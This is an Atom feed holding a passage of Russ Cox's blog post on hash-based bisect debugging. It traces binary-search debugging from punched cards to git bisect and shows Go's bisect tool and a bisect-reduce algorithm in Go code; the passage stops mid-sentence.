<feed xmlns="http://www.w3.org/2005/Atom">
  <title>research!rsc</title>
  <id>tag:research.swtch.com,2012:research.swtch.com</id>
  <link rel="self" href="http://research.swtch.com/feed.atom"></link>
  <updated>2024-07-18T10:19:53-04:00</updated>
  <author>
    <name>Russ Cox</name>
    <uri>https://swtch.com/~rsc</uri>
    <email>rsc@swtch.com</email>
  </author>
  <entry>
    <title>Hash-Based Bisect Debugging in Compilers and Runtimes</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/bisect</id>
    <link rel="alternate" href="http://research.swtch.com/bisect"></link>
    <published>2024-07-18T10:18:53-04:00</published>
    <updated>2024-07-18T10:20:53-04:00</updated>
    <summary type="text">Binary search over program code or execution to find why a new library or compiler causes a failure.</summary>
    <content type="html">&lt;style&gt;&#xA;blockquote {&#xA;  padding-left: 0.5em;&#xA;  border-left-style: solid;&#xA;  border-left-width: 4px;&#xA;  border-left-color: #ccf;&#xA;}&#xA;&lt;/style&gt;&#xA;&lt;a class=anchor href=&#34;#setting_the_stage&#34;&gt;&lt;h2 id=&#34;setting_the_stage&#34;&gt;Setting the Stage&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Does this sound familar?&#xA;You make a change to a library to optimize its performance&#xA;or clean up technical debt&#xA;or fix a bug,&#xA;only to get a bug report:&#xA;some very large, incomprehensibly opaque test&#xA;is now failing.&#xA;Or you add a new compiler optimization with a similar result.&#xA;Now you have a major debugging job&#xA;in an unfamiliar code base.&#xA;&#xA;&lt;p&gt;&#xA;What if I told you that a magic wand exists&#xA;that can pinpoint the relevant line of code or call stack&#xA;in that unfamiliar code base?&#xA;It exists.&#xA;It is a real tool, and I’m going to show it to you.&#xA;This description might seem a bit over the top,&#xA;but every time I use this tool, it really does feel like magic.&#xA;Not just any magic either, but the best kind of magic:&#xA;delightful to watch even when you know exactly how it works.&#xA;&lt;a class=anchor href=&#34;#binary_search_and_bisecting_data&#34;&gt;&lt;h2 id=&#34;binary_search_and_bisecting_data&#34;&gt;Binary Search and Bisecting Data&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Before we get to the new trick, let’s take a look at some&#xA;simpler, older tricks.&#xA;Every good magician starts with mastery of the basic techniques.&#xA;In our case, that technique is binary search.&#xA;Most presentations of binary search talk about&#xA;finding an item in a sorted list,&#xA;but there are far more interesting uses.&#xA;Here is an example I wrote long ago for Go’s &lt;a href=&#34;https://go.dev/pkg/sort/#Search&#34;&gt;&lt;code&gt;sort.Search&lt;/code&gt;&lt;/a&gt; documentation:&#xA;&lt;pre&gt;func GuessingGame() {&#xA;    var s string&#xA;    fmt.Printf(&#34;Pick an integer from 0 to 100.\n&#34;)&#xA;    answer := sort.Search(100, func(i int) bool {&#xA;        fmt.Printf(&#34;Is your number &amp;lt;= %d? &#34;, i)&#xA;        fmt.Scanf(&#34;%s&#34;, &amp;amp;s)&#xA;        return s != &#34;&#34; &amp;amp;&amp;amp; s[0] == &#39;y&#39;&#xA;    })&#xA;    fmt.Printf(&#34;Your number is %d.\n&#34;, answer)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If we run this code, it plays a guessing game with us:&#xA;&lt;pre&gt;% go run guess.go&#xA;Pick an integer from 0 to 100.&#xA;Is your number &amp;lt;= 50? y&#xA;Is your number &amp;lt;= 25? n&#xA;Is your number &amp;lt;= 38? y&#xA;Is your number &amp;lt;= 32? y&#xA;Is your number &amp;lt;= 29? n&#xA;Is your number &amp;lt;= 31? n&#xA;Your number is 32.&#xA;%&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The same guessing game can be applied to debugging.&#xA;In his &lt;i&gt;Programming Pearls&lt;/i&gt; column titled “Aha! Algorithms”&#xA;in &lt;i&gt;Communications of the ACM&lt;/i&gt; (September 1983),&#xA;Jon Bentley called binary search “a solution that looks for problems.”&#xA;Here’s one of his examples:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Roy Weil applied the technique [binary search]&#xA;in cleaning a deck of about a thousand punched cards that contained a single bad card.&#xA;Unfortunately the bad card wasn’t known by sight; it could only be identified by running&#xA;some subset of the cards through a program and seeing a wildly erroneous answer—this&#xA;process took several minutes. His predecessors at the task tried to solve it by running a&#xA;few cards at a time through the program, and were making steady (but slow)&#xA;progress toward a solution. How did Weil find the culprit in just ten runs of the program?&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Obviously, Weil played the guessing game using binary search.&#xA;Is the bad card in the first 500? Yes. The first 250? No. And so on.&#xA;This is the earliest published description of debugging by binary search&#xA;that I have been able to find.&#xA;In this case, it was for debugging data.&#xA;&lt;a class=anchor href=&#34;#bisecting_version_history&#34;&gt;&lt;h2 id=&#34;bisecting_version_history&#34;&gt;Bisecting Version History&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We can apply binary search to a program’s version history instead of data.&#xA;Every time we notice a new bug in an old program,&#xA;we play the guessing game “when did this program last work?”&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;Did it work 50 days ago? Yes.&#xA;&lt;li&gt;&#xA;Did it work 25 days ago? No.&#xA;&lt;li&gt;&#xA;Did it work 38 days ago? Yes.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;And so on,&#xA;until we find that the program last worked correctly 32 days ago,&#xA;meaning the bug was introduced 31 days ago.&#xA;&#xA;&lt;p&gt;&#xA;Debugging through time with binary search is a very old trick,&#xA;independently discovered many times by many people.&#xA;For example, we could play the guessing game using&#xA;commands like&#xA;&lt;code&gt;cvs checkout -D &#39;31 days ago&#39;&lt;/code&gt;&#xA;or Plan 9’s &lt;a href=&#34;https://9fans.github.io/plan9port/man/man1/yesterday.html&#34;&gt;more musical&lt;/a&gt;&#xA;&lt;code&gt;yesterday -n 31&lt;/code&gt;.&#xA;To some programmers, the techniques of using binary search&#xA;to debug data or debug through time seem&#xA;“&lt;a href=&#34;https://groups.google.com/g/comp.compilers/c/vGh4s3HBQ-s/m/qmrVKmF5AgAJ&#34;&gt;so basic that there is no need to write them down&lt;/a&gt;.”&#xA;But writing a trick down is the first step to making sure everyone can do it:&#xA;magic tricks can be basic but not obvious.&#xA;In software, writing a trick down is also the first step to automating it and building good tools.&#xA;&#xA;&lt;p&gt;&#xA;In the late-1990s, the idea of binary search over version history&#xA;was &lt;a href=&#34;https://groups.google.com/g/comp.compilers/c/vGh4s3HBQ-s/m/Chvpu7vTAgAJ&#34;&gt;written down at least twice&lt;/a&gt;.&#xA;Brian Ness and Viet Ngo published&#xA;“&lt;a href=&#34;https://ieeexplore.ieee.org/abstract/document/625082&#34;&gt;Regression containment through source change isolation&lt;/a&gt;” at COMPSAC ’97 (August 1997)&#xA;describing a system built at Cray Research that they used to deliver much more frequent non-regressing compiler releases.&#xA;Independently, Larry McVoy published a file “&lt;a href=&#34;https://elixir.bootlin.com/linux/1.3.73/source/Documentation/BUG-HUNTING&#34;&gt;Documentation/BUG-HUNTING&lt;/a&gt;” in the Linux 1.3.73 release (March 1996).&#xA;He captured how magical it feels that the trick works even if you have no particular expertise in the code being tested:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;This is how to track down a bug if you know nothing about kernel hacking.&#xA;It’s a brute force approach but it works pretty well. &lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;You need:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&#xA;A reproducible bug - it has to happen predictably (sorry)&#xA;&lt;li&gt;&#xA;&#xA;All the kernel tar files from a revision that worked to the revision that doesn’t&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;You will then do:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&#xA;Rebuild a revision that you believe works, install, and verify that.&#xA;&lt;li&gt;&#xA;&#xA;Do a binary search over the kernels to figure out which one&#xA;introduced the bug.  I.e., suppose 1.3.28 didn’t have the bug, but&#xA;you know that 1.3.69 does.  Pick a kernel in the middle and build&#xA;that, like 1.3.50.  Build &amp;amp; test; if it works, pick the mid point&#xA;between .50 and .69, else the mid point between .28 and .50.&#xA;&lt;li&gt;&#xA;&#xA;You’ll narrow it down to the kernel that introduced the bug.  You&#xA;can probably do better than this but it gets tricky.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;. . . &lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;My apologies to Linus and the other kernel hackers for describing this&#xA;brute force approach, it’s hardly what a kernel hacker would do.  However,&#xA;it does work and it lets non-hackers help bug fix.  And it is cool&#xA;because Linux snapshots will let you do this - something that you can’t&#xA;do with vender supplied releases.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Later, Larry McVoy created Bitkeeper,&#xA;which Linux used as its first source control system.&#xA;Bitkeeper provided a way to print the longest straight line&#xA;of changes through the directed acyclic graph of commits,&#xA;providing a more fine-grained timeline for binary search.&#xA;When Linus Torvalds created Git, he carried that idea forward&#xA;as &lt;a href=&#34;https://github.com/git/git/commit/8b3a1e056f2107deedfdada86046971c9ad7bb87&#34;&gt;&lt;code&gt;git rev-list --bisect&lt;/code&gt;&lt;/a&gt;, which&#xA;enabled the same kind of manual binary search.&#xA;A few days after adding it, he &lt;a href=&#34;https://groups.google.com/g/fa.linux.kernel/c/N4CqlNCvFCY/m/ItQoFhVZyJgJ&#34;&gt;explained how to use it&lt;/a&gt; on the Linux kernel mailing list:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Hmm.. Since you seem to be a git user, maybe you could try the git&#xA;&#34;bisect&#34; thing to help narrow down exactly where this happened (and help&#xA;test that thing too ;). &lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;You can basically use git to find the half-way point between a set of&#xA;&#34;known good&#34; points and a &#34;known bad&#34; point (&#34;bisecting&#34; the set of&#xA;commits), and doing just a few of those should give us a much better view&#xA;of where things started going wrong. &lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;For example, since you know that 2.6.12-rc3 is good, and 2.6.12 is bad,&#xA;you’d do &lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;git-rev-list --bisect v2.6.12 ^v2.6.12-rc3 &lt;br&gt;&#xA;&lt;br&gt;&#xA;&#xA;where the &#34;v2.6.12 ^v2.6.12-rc3&#34; thing basically means &#34;everything in&#xA;v2.6.12 but _not_ in v2.6.12-rc3&#34; (that’s what the ^ marks), and the&#xA;&#34;--bisect&#34; flag just asks git-rev-list to list the middle-most commit,&#xA;rather than all the commits in between those kernel versions.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;This response started a &lt;a href=&#34;https://groups.google.com/g/fa.linux.kernel/c/cp6abJnEN5U/m/5Z5s14LkzR4J&#34;&gt;separate discussion&lt;/a&gt;&#xA;about making the process easier, which led eventually to the&#xA;&lt;a href=&#34;https://git-scm.com/docs/git-bisect&#34;&gt;&lt;code&gt;git bisect&lt;/code&gt;&lt;/a&gt; tool that exists today.&#xA;&#xA;&lt;p&gt;&#xA;Here’s an example. We tried updating to a newer version of Go&#xA;and found that a test fails.&#xA;We can use &lt;code&gt;git bisect&lt;/code&gt; to pinpoint the specific commit that caused the failure:&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&lt;pre&gt;% git bisect start master go1.21.0&#xA;Previous HEAD position was 3b8b550a35 doc: document run..&#xA;Switched to branch &#39;master&#39;&#xA;Your branch is ahead of &#39;origin/master&#39; by 5 commits.&#xA;Bisecting: a merge base must be tested&#xA;[2639a17f146cc7df0778298c6039156d7ca68202] doc: run rel...&#xA;% git bisect run sh -c &#39;&#xA;    git clean -df&#xA;    cd src&#xA;    ./make.bash || exit 125&#xA;    cd $HOME/src/rsc.io/tmp/timertest/retry&#xA;    go list || exit 0&#xA;    go test -count=5&#xA;&#39;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;It takes some care to write a correct &lt;code&gt;git bisect&lt;/code&gt; invocation,&#xA;but once you get it right, you can walk away while &lt;code&gt;git bisect&lt;/code&gt;&#xA;works its magic.&#xA;In this case, the script we pass to &lt;code&gt;git bisect run&lt;/code&gt; cleans out any stale files&#xA;and then builds the Go toolchain (&lt;code&gt;./make.bash&lt;/code&gt;).&#xA;If that step fails, it exits with code 125,&#xA;a special inconclusive answer for &lt;code&gt;git bisect&lt;/code&gt;:&#xA;something else is wrong with this commit and we can’t say&#xA;whether or not the bug we’re looking for is present.&#xA;Otherwise it changes into the directory of the failing test.&#xA;If &lt;code&gt;go list&lt;/code&gt; fails, which happens if the bisect uses a version of Go that’s too old,&#xA;the script exits successfully, indicating that the bug is not present.&#xA;Otherwise the script runs &lt;code&gt;go test&lt;/code&gt; and exits with the&#xA;status from that command. The &lt;code&gt;-count=5&lt;/code&gt; is there because&#xA;this is a flaky failure that does not always happen: running five times&#xA;is enough to make sure we observe the bug if it is present.&#xA;&#xA;&lt;p&gt;&#xA;When we run this command, &lt;code&gt;git bisect&lt;/code&gt; prints a lot of output,&#xA;along with the output of our test script,&#xA;to make sure we can see the progress:&#xA;&lt;pre&gt;% git bisect run ...&#xA;...&#xA;go: download go1.23 for darwin/arm64: toolchain not available&#xA;Bisecting: 1360 revisions left to test after this (roughly 10 steps)&#xA;[752379113b7c3e2170f790ec8b26d590defc71d1]&#xA;    runtime/race: update race syso for PPC64LE&#xA;...&#xA;go: download go1.23 for darwin/arm64: toolchain not available&#xA;Bisecting: 680 revisions left to test after this (roughly 9 steps)&#xA;[ff8a2c0ad982ed96aeac42f0c825219752e5d2f6]&#xA;    go/types: generate mono.go from types2 source&#xA;...&#xA;ok      rsc.io/tmp/timertest/retry  10.142s&#xA;Bisecting: 340 revisions left to test after this (roughly 8 steps)&#xA;[97f1b76b4ba3072ab50d0d248fdce56e73b45baf]&#xA;    runtime: optimize timers.cleanHead&#xA;...&#xA;FAIL    rsc.io/tmp/timertest/retry  22.136s&#xA;Bisecting: 169 revisions left to test after this (roughly 7 steps)&#xA;[80157f4cff014abb418004c0892f4fe48ee8db2e]&#xA;    io: close PipeReader in test&#xA;...&#xA;ok      rsc.io/tmp/timertest/retry  10.145s&#xA;Bisecting: 84 revisions left to test after this (roughly 6 steps)&#xA;[8f7df2256e271c8d8d170791c6cd90ba9cc69f5e]&#xA;    internal/asan: match runtime.asan{read,write} len parameter type&#xA;...&#xA;FAIL    rsc.io/tmp/timertest/retry  20.148s&#xA;Bisecting: 42 revisions left to test after this (roughly 5 steps)&#xA;[c9ed561db438ba413ba8cfac0c292a615bda45a8]&#xA;    debug/elf: avoid using binary.Read() in NewFile()&#xA;...&#xA;FAIL    rsc.io/tmp/timertest/retry  14.146s&#xA;Bisecting: 20 revisions left to test after this (roughly 4 steps)&#xA;[2965dc989530e1f52d80408503be24ad2582871b]&#xA;    runtime: fix lost sleep causing TestZeroTimer flakes&#xA;...&#xA;FAIL    rsc.io/tmp/timertest/retry  18.152s&#xA;Bisecting: 10 revisions left to test after this (roughly 3 steps)&#xA;[b2e9221089f37400f309637b205f21af7dcb063b]&#xA;    runtime: fix another lock ordering problem&#xA;...&#xA;ok      rsc.io/tmp/timertest/retry  10.142s&#xA;Bisecting: 5 revisions left to test after this (roughly 3 steps)&#xA;[418e6d559e80e9d53e4a4c94656e8fb4bf72b343]&#xA;    os,internal/godebugs: add missing IncNonDefault calls&#xA;...&#xA;ok      rsc.io/tmp/timertest/retry  10.163s&#xA;Bisecting: 2 revisions left to test after this (roughly 2 steps)&#xA;[6133c1e4e202af2b2a6d4873d5a28ea3438e5554]&#xA;    internal/trace/v2: support old trace format&#xA;...&#xA;FAIL    rsc.io/tmp/timertest/retry  22.164s&#xA;Bisecting: 0 revisions left to test after this (roughly 1 step)&#xA;[508bb17edd04479622fad263cd702deac1c49157]&#xA;    time: garbage collect unstopped Tickers and Timers&#xA;...&#xA;FAIL    rsc.io/tmp/timertest/retry  16.159s&#xA;Bisecting: 0 revisions left to test after this (roughly 0 steps)&#xA;[74a0e3160d969fac27a65cd79a76214f6d1abbf5]&#xA;    time: clean up benchmarks&#xA;...&#xA;ok      rsc.io/tmp/timertest/retry  10.147s&#xA;508bb17edd04479622fad263cd702deac1c49157 is the first bad commit&#xA;commit 508bb17edd04479622fad263cd702deac1c49157&#xA;Author:     Russ Cox &amp;lt;rsc@golang.org&amp;gt;&#xA;AuthorDate: Wed Feb 14 20:36:47 2024 -0500&#xA;Commit:     Russ Cox &amp;lt;rsc@golang.org&amp;gt;&#xA;CommitDate: Wed Mar 13 21:36:04 2024 +0000&#xA;&#xA;    time: garbage collect unstopped Tickers and Timers&#xA;    ...&#xA;    This CL adds an undocumented GODEBUG asynctimerchan=1&#xA;    that will disable the change. The documentation happens in&#xA;    the CL 568341.&#xA;    ...&#xA;&#xA;bisect found first bad commit&#xA;%&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This bug appears to be caused by my new&#xA;garbage-collection-friendly timer implementation that will be in Go 1.23.&#xA;&lt;i&gt;Abracadabra!&lt;/i&gt;&#xA;&lt;a class=anchor href=&#34;#new_trick&#34;&gt;&lt;h2 id=&#34;new_trick&#34;&gt;A New Trick: Bisecting Program Locations&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The culprit commit that &lt;code&gt;git bisect&lt;/code&gt; identified is a significant change to the timer&#xA;implementation.&#xA;I anticipated that it might cause subtle test failures,&#xA;so I included a &lt;a href=&#34;https://go.dev/doc/godebug&#34;&gt;GODEBUG setting&lt;/a&gt;&#xA;to toggle between the old implementation and the new one.&#xA;Sure enough, toggling it makes the bug disappear:&#xA;&lt;pre&gt;% GODEBUG=asynctimerchan=1 go test -count=5 # old&#xA;PASS&#xA;ok      rsc.io/tmp/timertest/retry  10.117s&#xA;% GODEBUG=asynctimerchan=0 go test -count=5 # new&#xA;--- FAIL: TestDo (4.00s)&#xA;    ...&#xA;--- FAIL: TestDo (6.00s)&#xA;    ...&#xA;--- FAIL: TestDo (4.00s)&#xA;    ...&#xA;FAIL    rsc.io/tmp/timertest/retry  18.133s&#xA;%&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Knowing which commit caused a bug, along with minimal information&#xA;about the failure, is often enough to help identify the mistake.&#xA;But what if it’s not?&#xA;What if the test is large and complicated and entirely code you’ve never seen before,&#xA;and it fails in some inscrutable way that doesn’t seem to have anything&#xA;to do with your change?&#xA;When you work on compilers or low-level libraries, this happens quite often.&#xA;For that, we have a new magic trick: bisecting program locations.&#xA;&#xA;&lt;p&gt;&#xA;That is, we can run binary search on a different axis: over the &lt;i&gt;program’s code&lt;/i&gt;, not its version history.&#xA;We’ve implemented this search in a new tool unimaginatively named &lt;code&gt;bisect&lt;/code&gt;.&#xA;When applied to library function behavior like the timer change,&#xA;&lt;code&gt;bisect&lt;/code&gt; can search over all stack traces leading to the new code,&#xA;enabling the new code for some stacks and disabling it for others.&#xA;By repeated execution, it can narrow the failure down to enabling&#xA;the code only for one specific stack:&#xA;&lt;pre&gt;% go install golang.org/x/tools/cmd/bisect@latest&#xA;% bisect -godebug asynctimerchan=1 go test -count=5&#xA;...&#xA;bisect: FOUND failing change set&#xA;--- change set #1 (disabling changes causes failure)&#xA;internal/godebug.(*Setting).Value()&#xA;    /Users/rsc/go/src/internal/godebug/godebug.go:165&#xA;time.syncTimer()&#xA;    /Users/rsc/go/src/time/sleep.go:25&#xA;time.NewTimer()&#xA;    /Users/rsc/go/src/time/sleep.go:145&#xA;time.After()&#xA;    /Users/rsc/go/src/time/sleep.go:203&#xA;rsc.io/tmp/timertest/retry.Do()&#xA;    /Users/rsc/src/rsc.io/tmp/timertest/retry/retry.go:37&#xA;rsc.io/tmp/timertest/retry.TestDo()&#xA;    /Users/rsc/src/rsc.io/tmp/timertest/retry/retry_test.go:63&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Here the &lt;code&gt;bisect&lt;/code&gt; tool is reporting that disabling &lt;code&gt;asynctimerchan=1&lt;/code&gt;&#xA;(that is, enabling the new implementation)&#xA;only for this one call stack suffices to provoke the test failure.&#xA;&#xA;&lt;p&gt;&#xA;One of the hardest things about debugging is running a program&#xA;backward: there’s a data structure with a bad value,&#xA;or the control flow has zigged instead of zagged,&#xA;and it’s very difficult to understand how it could have gotten&#xA;into that state.&#xA;In contrast, this &lt;code&gt;bisect&lt;/code&gt; tool is showing the stack at the moment&#xA;just &lt;i&gt;before&lt;/i&gt; things go wrong:&#xA;the stack identifies the critical decision point that determines whether the&#xA;test passes or fails.&#xA;In contrast to puzzling backward,&#xA;it is usually easy to look forward&#xA;in the program execution to understand why this&#xA;specific decision would matter.&#xA;Also, in an enormous code base, the bisection has&#xA;identified the specific few lines where we should start debugging.&#xA;We can read the code responsible for that specific sequence of calls&#xA;and look into why the new timers would change the&#xA;code’s behavior.&#xA;&#xA;&lt;p&gt;&#xA;When you are working on a compiler or runtime and cause&#xA;a test failure in an enormous, unfamiliar code base,&#xA;and then this &lt;code&gt;bisect&lt;/code&gt; tool narrows down the cause to&#xA;a few specific lines of code, it is truly a magical experience.&#xA;&#xA;&lt;p&gt;&#xA;The rest of this post explains the inner workings of&#xA;this &lt;code&gt;bisect&lt;/code&gt; tool, which Keith Randall, David Chase, and I&#xA;developed and refined over the past decade of work on Go.&#xA;Other people and projects have realized the idea of&#xA;bisecting program locations too:&#xA;I am not claiming that we were the first to discover it.&#xA;However, I think we have developed the approach further&#xA;and systematized it more than others.&#xA;This post documents what we’ve&#xA;learned, so that others can build on our efforts rather than rediscover them.&#xA;&lt;a class=anchor href=&#34;#example&#34;&gt;&lt;h2 id=&#34;example&#34;&gt;Example: Bisecting Function Optimization&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Let’s start with a simple example and work back up to stack traces.&#xA;Suppose we are working on a compiler and know that a test program&#xA;fails only when compiled with optimizations enabled.&#xA;We could make a list of all the functions in the program&#xA;and then try disabling optimization of functions one at a time&#xA;until we find a minimal set of functions (probably just one) whose&#xA;optimization triggers the bug.&#xA;Unsurprisingly, we can speed up that process&#xA;using binary search:&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;Change the compiler to print a list of every function it considers for optimization.&#xA;&lt;li&gt;&#xA;Change the compiler to accept a list of functions where optimization is allowed.&#xA;Passing it an empty list (optimize no functions) should make the test pass,&#xA;while passing the complete list (optimize all functions) should make the test fail.&#xA;&lt;li&gt;&#xA;Use binary search to determine the shortest list prefix&#xA;that can be passed to the compiler to make the test fail.&#xA;The last function in that list prefix is one that must be optimized&#xA;for the test to fail&#xA;(but perhaps not the only one).&#xA;&lt;li&gt;&#xA;Forcing that function to always be optimized, we can repeat&#xA;the process to find any other functions that must also be&#xA;optimized to provoke the bug.&lt;/ol&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;For example, suppose there are ten functions in the program&#xA;and we run these three binary search trials:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;hashbisect0func&#34; class=&#34;center pad&#34; width=197 height=238 src=&#34;hashbisect0func.png&#34; srcset=&#34;hashbisect0func.png 1x, hashbisect0func@1.5x.png 1.5x, hashbisect0func@2x.png 2x, hashbisect0func@3x.png 3x, hashbisect0func@4x.png 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;When we optimize the first 5 functions, the test passes. 7? fail. 6? still pass.&#xA;This tells us that the seventh function, &lt;code&gt;sin&lt;/code&gt;, is one function that must&#xA;be optimized to provoke the failure.&#xA;More precisely, with &lt;code&gt;sin&lt;/code&gt; optimized, we know that&#xA;no functions later in the list need to be optimized,&#xA;but we don’t know whether any of functions earlier in the list must also be optimized.&#xA;To check the earlier locations, we can run another binary search&#xA;over the other remaining six list entries, always adding &lt;code&gt;sin&lt;/code&gt; as well:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;hashbisect0funcstep2&#34; class=&#34;center pad&#34; width=218 height=180 src=&#34;hashbisect0funcstep2.png&#34; srcset=&#34;hashbisect0funcstep2.png 1x, hashbisect0funcstep2@1.5x.png 1.5x, hashbisect0funcstep2@2x.png 2x, hashbisect0funcstep2@3x.png 3x, hashbisect0funcstep2@4x.png 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;This time, optimizing the first two (plus the hard-wired &lt;code&gt;sin&lt;/code&gt;) fails,&#xA;but optimizing the first one passes,&#xA;indicating that &lt;code&gt;cos&lt;/code&gt; must also be optimized.&#xA;Then we have just one suspect location left: &lt;code&gt;add&lt;/code&gt;.&#xA;A binary search over that one-entry list (plus the two hard-wired &lt;code&gt;cos&lt;/code&gt; and &lt;code&gt;sin&lt;/code&gt;)&#xA;shows that &lt;code&gt;add&lt;/code&gt; can be left off the list without losing the failure.&#xA;&#xA;&lt;p&gt;&#xA;Now we know the answer: one locally minimal set of functions to optimize to cause&#xA;the test failure is &lt;code&gt;cos&lt;/code&gt; and &lt;code&gt;sin&lt;/code&gt;.&#xA;By locally minimal, I mean that removing any function from the set&#xA;makes the test failure disappear: optimizing &lt;code&gt;cos&lt;/code&gt; or &lt;code&gt;sin&lt;/code&gt; by itself is not enough.&#xA;However, the set may still not be globally minimal:&#xA;perhaps optimizing only &lt;code&gt;tan&lt;/code&gt; would cause a different failure (or not).&#xA;&#xA;&lt;p&gt;&#xA;It might be tempting to run the search more like a&#xA;traditional binary search, cutting the list being searched in half at each step.&#xA;That is, after confirming that the&#xA;program passes when optimizing the first half,&#xA;we might consider discarding that half of the list and continuing the binary search on the other half.&#xA;Applied to our example, that algorithm would run like this:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;hashbisect0funcbad&#34; class=&#34;center pad&#34; width=290 height=237 src=&#34;hashbisect0funcbad.png&#34; srcset=&#34;hashbisect0funcbad.png 1x, hashbisect0funcbad@1.5x.png 1.5x, hashbisect0funcbad@2x.png 2x, hashbisect0funcbad@3x.png 3x, hashbisect0funcbad@4x.png 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;The first trial passing would suggest the incorrect optimization is in the second&#xA;half of the list, so we discard the first half.&#xA;But now &lt;code&gt;cos&lt;/code&gt; is never optimized (it just got discarded),&#xA;so all future trials pass too,&#xA;leading to a contradiction: we lost track of the way to make the program fail.&#xA;The problem is that discarding part of the list is only justified if we know that part doesn’t matter.&#xA;That’s only true if the bug is caused by optimizing a single function,&#xA;which may be likely but is not guaranteed.&#xA;If the bug only manifests when optimizing multiple functions at once,&#xA;discarding half the list discards the failure.&#xA;That’s why the binary search must in general be over list prefix lengths, not list subsections.&#xA;&lt;a class=anchor href=&#34;#bisect-reduce&#34;&gt;&lt;h2 id=&#34;bisect-reduce&#34;&gt;Bisect-Reduce&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The “repeated binary search” algorithm we just looked at does work,&#xA;but the need for the repetition suggests that binary search may not&#xA;be the right core algorithm. Here is a more direct algorithm,&#xA;which I’ll call the “bisect-reduce” algorithm, since it is a&#xA;bisection-based reduction.&#xA;&#xA;&lt;p&gt;&#xA;For simplicity, let’s assume we have a global function &lt;code&gt;buggy&lt;/code&gt;&#xA;that reports whether the bug is triggered when our change is&#xA;enabled at the given list of locations:&#xA;&lt;pre&gt;// buggy reports whether the bug is triggered&#xA;// by enabling the change at the listed locations.&#xA;func buggy(locations []string) bool&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;BisectReduce&lt;/code&gt; takes a single input list &lt;code&gt;targets&lt;/code&gt; for which&#xA;&lt;code&gt;buggy(targets)&lt;/code&gt; is true and returns a locally minimal subset &lt;code&gt;x&lt;/code&gt;&#xA;for which &lt;code&gt;buggy(x)&lt;/code&gt; remains true. It invokes a more generalized&#xA;helper &lt;code&gt;bisect&lt;/code&gt;, which takes an additional argument: a &lt;code&gt;forced&lt;/code&gt;&#xA;list of locations to keep enabled during the reduction.&#xA;&lt;pre&gt;// BisectReduce returns a locally minimal subset x of targets&#xA;// where buggy(x) is true, assuming that buggy(targets) is true.&#xA;func BisectReduce(targets []string) []string {&#xA;    return bisect(targets, []string{})&#xA;}&#xA;&#xA;// bisect returns a locally minimal subset x of targets&#xA;// where buggy(x+forced) is true, assuming that&#xA;// buggy(targets+forced) is true.&#xA;//&#xA;// Precondition: buggy(targets+forced) = true.&#xA;//&#xA;// Postcondition: buggy(result+forced) = true,&#xA;// and buggy(x+forced) = false for any x ⊂ result.&#xA;func bisect(targets []string, forced []string) []string {&#xA;    if len(targets) == 0 || buggy(forced) {&#xA;        // Targets are not needed at all.&#xA;        return []string{}&#xA;    }&#xA;    if len(targets) == 1 {&#xA;        // Reduced list to a single required entry.&#xA;        return []string{targets[0]}&#xA;    }&#xA;&#xA;    // Split targets in half and reduce each side separately.&#xA;    m := len(targets)/2&#xA;    left, right := targets[:m], targets[m:]&#xA;    leftReduced := bisect(left, slices.Concat(right, forced))&#xA;    rightReduced := bisect(right, slices.Concat(leftReduced, forced))&#xA;    return slices.Concat(leftReduced, rightReduced)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Like any good divide-and-conquer algorithm, a few lines do quite a lot:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If the target list has been reduced to nothing,&#xA;or if &lt;code&gt;buggy(forced)&lt;/code&gt; (without any targets) is true,&#xA;then we can return an empty list.&#xA;Otherwise we know something from targets is 